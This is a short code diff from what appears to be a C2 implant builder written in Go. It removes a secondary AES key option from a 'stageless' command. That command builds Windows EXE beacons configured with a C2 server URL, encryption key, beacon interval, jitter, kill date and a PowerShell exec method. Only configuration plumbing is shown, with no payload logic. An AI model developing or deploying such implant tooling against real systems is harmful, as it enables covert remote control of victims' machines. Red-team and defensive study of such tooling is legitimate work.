@@ -156,8 +156,7 @@ var stagelessCmd = &cobra.Command{
 func init() {
 	stagelessCmd.Flags().String("c2", "", "C2 server URL")
 	stagelessCmd.Flags().String("key", "", "AES encryption key (must match server ENCRYPTION_KEY)")
-	stagelessCmd.Flags().String("secondary-key", "", "Secondary AES key (must match server SECONDARY_KEY)")
-	stagelessCmd.Flags().Int("interval", 30, "Beacon interval (seconds)")
+stagelessCmd.Flags().Int("interval", 30, "Beacon interval (seconds)")
 	stagelessCmd.Flags().Int("jitter", 20, "Jitter percent")
 	stagelessCmd.Flags().String("kill-date", "", "Kill date YYYY-MM-DD")
 	stagelessCmd.Flags().String("exec-method", "powershell", "Default exec method")
@@ -190,7 +189,6 @@ func init() {
 func runStageless(cmd *cobra.Command, _ []string) error {
 	c2, _ := cmd.Flags().GetString("c2")
 	key, _ := cmd.Flags().GetString("key")
-	secKey, _ := cmd.Flags().GetString("secondary-key")
 	interval, _ := cmd.Flags().GetInt("interval")
 	jitter, _ := cmd.Flags().GetInt("jitter")
 	killDate, _ := cmd.Flags().GetString("kill-date")
@@ -264,8 +262,7 @@ func runStageless(cmd *cobra.Command, _ []string) error {
 		cCfg := &CConfig{
 			ServerURL:     c2,
 			EncKey:        key,
-			SecKey:        secKey,
-			IntervalSec:   interval,
+				IntervalSec:   interval,
 			JitterPct:     jitter,
 			KillDate:      killDate,
 			ExecMethod:    execMethod,
@@ -363,7 +360,6 @@ func runStageless(cmd *cobra.Command, _ []string) error {
 	result, err := g.Build(&Config{
 		ServerURL:    c2,
 		EncKey:       key,
-		SecondaryKey: secKey,
 		TargetOS:     OSWindows,
 		TargetArch:   TargetArch(arch),
 		Format:       FormatEXE,
